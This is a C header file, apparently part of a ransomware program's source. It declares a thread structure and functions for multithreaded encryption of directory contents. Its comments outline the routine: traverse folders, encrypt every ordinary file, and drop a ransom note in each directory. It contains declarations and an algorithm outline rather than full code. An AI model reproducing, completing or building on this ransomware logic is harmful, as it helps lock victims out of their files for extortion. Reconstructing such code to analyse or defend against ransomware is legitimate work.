#pragma once
#include "Crypto.h"
#ifndef __Threading_h__
#define __Threading_h__

typedef struct {
	HANDLE* threadArray;
	DWORD threadCount;
	BOOL isEncrypting;
	CRITICAL_SECTION threadCriticalSection;
	LPSTR dirPath;
	//DWORD drive_name_ptr;
} THREAD_STRUCT;

extern THREAD_STRUCT threadStruct;
void threadEncrypt(THREAD_STRUCT* pThreadStruct);
int initThreadStruct();
int launchThreadEncrypt();
void cleanUpThreadStruct();

// takes in HCRYPTKEY, HCRYPTPROV, directory_to_encrypt
// 1. FindFirstFileW in the directory
// 1,5. If can't find first file, exit
// 2. If the file is a directory, check name -> add directory name back to thread struct. Enter and exit critical section
// 2,5. Make sure to drop the ransom note in the directory.
// 3. If file is a normal file, encrypt -> loop back
// 4. while ( FindNextFileW(file_search_handle, &lpFindFileData, v56) );
// 5. FindClose
int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, BYTE* key, BYTE* nonce, LPSTR directoryName, THREAD_STRUCT* pThreadStruct);
#endif
